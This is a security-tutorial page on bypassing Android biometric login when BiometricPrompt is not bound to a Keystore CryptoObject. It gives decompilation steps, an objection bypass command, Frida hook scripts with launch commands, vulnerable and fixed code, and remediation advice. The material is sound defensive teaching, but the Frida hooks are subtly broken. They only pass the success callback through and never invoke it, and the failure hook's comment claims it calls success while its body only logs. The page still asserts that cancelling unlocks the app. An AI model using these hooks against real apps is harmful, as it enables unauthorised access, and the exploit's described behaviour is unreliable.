---
title: "Biometric / local-auth bypass"
description: "BiometricPrompt misuse: trusting onAuthenticationSucceeded as a bare boolean instead of binding it to a CryptoObject — hooking the callback with Frida/objection, and the Keystore-bound fix."
tags:
  - Android
  - Authentication
  - Biometric
  - Frida
  - OWASP Mobile Top 10
---

# Biometric / local-auth bypass

!!! note "What this page is doing"
    This is OWASP Mobile Top 10 **M3 — Insecure authentication/authorization**, specific to biometrics. `BiometricPrompt` is a UI and a callback, not a cryptographic guarantee on its own. If the app treats a call into `onAuthenticationSucceeded()` as proof that something should now be unlocked — without that callback also handing back a `CryptoObject` the app actually needed to decrypt or sign something — the fingerprint or face scan is theater: the callback itself is just a method that can be called.

## Explanation

`BiometricPrompt` has two legitimate modes of use:

1. **Unbound (presentation-only):** the app calls `authenticate(promptInfo)` with no `CryptoObject`, shows the system biometric UI, and on `onAuthenticationSucceeded(result)` treats the callback as "the user is now authenticated" — often setting a boolean or proceeding to decrypt local data the app itself can already read.
2. **Bound (cryptographically enforced):** the app calls `authenticate(promptInfo, cryptoObject)` where the `CryptoObject` wraps a `Cipher` or `Signature` initialized with a key stored in the Android Keystore, created with `setUserAuthenticationRequired(true)`. The Keystore itself — not the app — refuses to release or use that key until the OS confirms a genuine biometric match. `onAuthenticationSucceeded(result)` then hands back `result.cryptoObject`, and only *that* object's cipher can do anything useful (decrypt a token, sign a challenge).

Mode 1 is the vulnerable pattern. Nothing stops `onAuthenticationSucceeded()` from being invoked by any means other than a genuine fingerprint match — including directly, from outside the normal flow, by an attacker who controls the process. The method is just a callback; whatever it does (set `isAuthenticated = true`, unlock a screen, proceed with a local check) is attacker-reachable without ever touching a sensor.

Mode 2 closes this because the *useful output* of success is cryptographic material that only exists if the Keystore itself released the key — and the Keystore's gate is enforced by the OS/TEE, not by app-level Java code that can be hooked and skipped.

## Exploitation

1. Decompile the app and find the `BiometricPrompt` / `BiometricPrompt.AuthenticationCallback` implementation.
2. Check whether `authenticate()` is called with a `CryptoObject` argument, and whether `onAuthenticationSucceeded` actually uses `result.cryptoObject` for anything, or just proceeds as if the callback firing is the whole proof.
3. If no `CryptoObject` is used (or the result's cipher is ignored), hook `onAuthenticationSucceeded` directly and invoke it, or force the underlying check it guards to succeed — no real biometric match is needed.
4. Confirm the gated functionality (unlocking the app, revealing a secret, approving a transaction) now proceeds.

## Steps

1. Decompile and find the biometric implementation:

    ```bash
    jadx -d out_jadx vulnerable-app.apk
    grep -Rnw out_jadx -e 'BiometricPrompt' -e 'onAuthenticationSucceeded' \
      -e 'CryptoObject' -e 'AuthenticationCallback'
    ```

2. Read the matched class and check two things specifically: does `authenticate(...)` take a `CryptoObject` parameter, and does `onAuthenticationSucceeded` use `result.cryptoObject` or ignore it:

    ```bash
    cat out_jadx/sources/com/example/vulnerableapp/auth/BiometricAuthHelper.java
    ```

3. The quickest confirmation of the vulnerable pattern with `objection`, which wraps this exact bypass:

    ```bash
    objection -g com.example.vulnerableapp explore
    android biometric disable
    ```

4. For a manual hook (when `objection`'s bundled bypass doesn't match the app's class names), resolve the callback with `frida-discover` or direct `grep`, then force the success path:

    ```bash
    frida-ps -Uai | grep -i vulnerableapp
    ```

    ```javascript
    Java.perform(function () {
        var AuthCallback = Java.use(
            'com.example.vulnerableapp.auth.BiometricAuthHelper$1'
        );

        // Replace the failure path so it always calls success instead
        AuthCallback.onAuthenticationFailed.implementation = function () {
            console.log('[hook] onAuthenticationFailed suppressed');
        };

        AuthCallback.onAuthenticationError.implementation = function (errorCode, errString) {
            console.log('[hook] onAuthenticationError suppressed: ' + errString);
        };

        // Call the success callback directly — no CryptoObject is needed
        // because the vulnerable app's implementation doesn't require one
        AuthCallback.onAuthenticationSucceeded.implementation = function (result) {
            console.log('[hook] onAuthenticationSucceeded forced');
            this.onAuthenticationSucceeded(result);
        };
    });
    ```

    ```bash
    frida -U -f com.example.vulnerableapp -l bypass_biometric.js --no-pause
    ```

5. Trigger the biometric prompt in the app UI, then cancel it or fail the scan deliberately — with the hook in place, the app should still proceed into the gated functionality.

6. If the app instead errors out or the gated action fails server-side, that is the signal the implementation is correctly bound to a `CryptoObject` — document that it resisted the bypass rather than forcing a false positive.

## Remediation

- **Always authenticate with a `CryptoObject`.** Call `BiometricPrompt.authenticate(promptInfo, cryptoObject)`, never the overload without it, whenever the prompt is meant to gate access to something real.
- **Back the `CryptoObject` with an Android Keystore key** created with `setUserAuthenticationRequired(true)` (and, where supported, `setInvalidatedByBiometricEnrollment(true)`), so the key is unusable unless the OS itself confirms the biometric match.
- **Use the result, not the callback firing, as proof.** In `onAuthenticationSucceeded(result)`, perform the actual decrypt/sign with `result.cryptoObject.cipher` (or `.signature`/`.mac`), and only unlock functionality once that operation succeeds — never on the callback alone.
- **Never gate authorization with a plain boolean set inside the callback.** The app should have nothing meaningful left to do if it skips straight past the biometric prompt; the useful artifact should only exist after the Keystore releases it.
- **Treat local biometric success as a convenience, not a server-side authorization event** for anything that touches backend data — pair it with a server-issued, short-lived token the way any other authentication event would be (see [insecure authentication](insecure-authentication.md)).

## Example

**Vulnerable: unbound BiometricPrompt, success is just a boolean**

```java
public class BiometricAuthHelper {
    public void authenticate(FragmentActivity activity, Runnable onSuccess) {
        Executor executor = ContextCompat.getMainExecutor(activity);
        BiometricPrompt biometricPrompt = new BiometricPrompt(activity, executor,
            new BiometricPrompt.AuthenticationCallback() {
                @Override
                public void onAuthenticationSucceeded(
                        BiometricPrompt.AuthenticationResult result) {
                    super.onAuthenticationSucceeded(result);
                    // No CryptoObject involved — this is just "the callback fired"
                    isUnlocked = true;
                    onSuccess.run();
                }
            });

        BiometricPrompt.PromptInfo promptInfo = new BiometricPrompt.PromptInfo.Builder()
            .setTitle("Unlock app")
            .setNegativeButtonText("Cancel")
            .build();

        // authenticate() called with NO CryptoObject argument
        biometricPrompt.authenticate(promptInfo);
    }
}
```

**Exploit: force the success callback with Frida**

```javascript
Java.perform(function () {
    var Callback = Java.use(
        'com.example.vulnerableapp.auth.BiometricAuthHelper$1'
    );
    Callback.onAuthenticationSucceeded.implementation = function (result) {
        console.log('[hook] forcing onAuthenticationSucceeded without a real scan');
        this.onAuthenticationSucceeded(result);
    };
});
```

```bash
frida -U -f com.example.vulnerableapp -l bypass_biometric.js --no-pause
```

Tapping "Cancel" on the prompt, or never presenting a finger at all, still results in `isUnlocked = true` and `onSuccess.run()` — the hook invokes the exact same callback the sensor would have, and the app has no way to tell the difference because nothing cryptographic was ever checked.

**Fixed: CryptoObject-bound, Keystore-enforced**

```kotlin
class BiometricAuthHelper {
    private val keyAlias = "biometric_unlock_key"

    private fun getOrCreateKey(): SecretKey {
        val keyStore = KeyStore.getInstance("AndroidKeyStore").apply { load(null) }
        (keyStore.getKey(keyAlias, null) as? SecretKey)?.let { return it }

        val keyGenerator = KeyGenerator.getInstance(
            KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore"
        )
        keyGenerator.init(
            KeyGenParameterSpec.Builder(
                keyAlias,
                KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT
            )
                .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
                .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
                .setUserAuthenticationRequired(true) // key unusable without biometric auth
                .setInvalidatedByBiometricEnrollment(true)
                .build()
        )
        return keyGenerator.generateKey()
    }

    fun authenticate(activity: FragmentActivity, onUnlocked: (Cipher) -> Unit) {
        val cipher = Cipher.getInstance("AES/GCM/NoPadding").apply {
            init(Cipher.DECRYPT_MODE, getOrCreateKey())
        }
        val cryptoObject = BiometricPrompt.CryptoObject(cipher)

        val executor = ContextCompat.getMainExecutor(activity)
        val biometricPrompt = BiometricPrompt(activity, executor,
            object : BiometricPrompt.AuthenticationCallback() {
                override fun onAuthenticationSucceeded(
                    result: BiometricPrompt.AuthenticationResult
                ) {
                    // The proof is the cipher the Keystore released, not the callback itself
                    val authenticatedCipher = result.cryptoObject?.cipher
                        ?: return // no cipher means no real Keystore-backed match
                    onUnlocked(authenticatedCipher)
                }
            })

        val promptInfo = BiometricPrompt.PromptInfo.Builder()
            .setTitle("Unlock app")
            .setNegativeButtonText("Cancel")
            .build()

        // authenticate() called WITH the CryptoObject
        biometricPrompt.authenticate(promptInfo, cryptoObject)
    }
}
```

A Frida hook on `onAuthenticationSucceeded` can still make the method run, but `result.cryptoObject` is only non-null and usable if the TEE actually released the key — forcing the callback without a genuine biometric match leaves the app with no usable cipher, and the decrypt that follows fails.
